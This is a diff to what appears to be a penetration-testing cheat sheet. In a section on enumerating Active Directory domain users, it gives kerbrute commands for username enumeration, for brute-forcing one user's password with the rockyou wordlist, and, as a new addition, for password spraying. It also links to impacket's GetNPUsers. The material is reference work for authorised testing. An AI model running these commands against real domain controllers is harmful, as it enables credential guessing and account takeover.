@@ -91,11 +91,13 @@ enumerate domain usernames
 
 ```shell
 # 1
-kerbrute_linux_amd64 -t 10 --dc <domain controller> -d <domain> userenum  ~/Documents/userlist.txt
+kerbrute_linux_amd64 -t <threads> --dc <domain controller> -d <domain> userenum  ~/Documents/userlist.txt
 # 2 valid users
 kerbrute userenum -d <domain> --dc <domain controller> ~/Documents/userlist.txt | grep "USERNAME" | cut -f1 -d"@" | cut -f4 -d":" | tr -d "[:blank:]" > /tmp/users.txt
 # bruteuser
-./kerbrute_linux_amd64 -t 10 --dc <domain controller> -d <domain> bruteuser ~/Documents/rockyou.txt <user>
+./kerbrute_linux_amd64 -t <threads> --dc <domain controller> -d <domain> bruteuser ~/Documents/rockyou.txt <user>
+# passwordspray
+./kerbrute_linux_amd64 -t <threads> --dc <domain controller> -d <domain> passwordspray <userlist> '<password>'
 ```
 
 [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
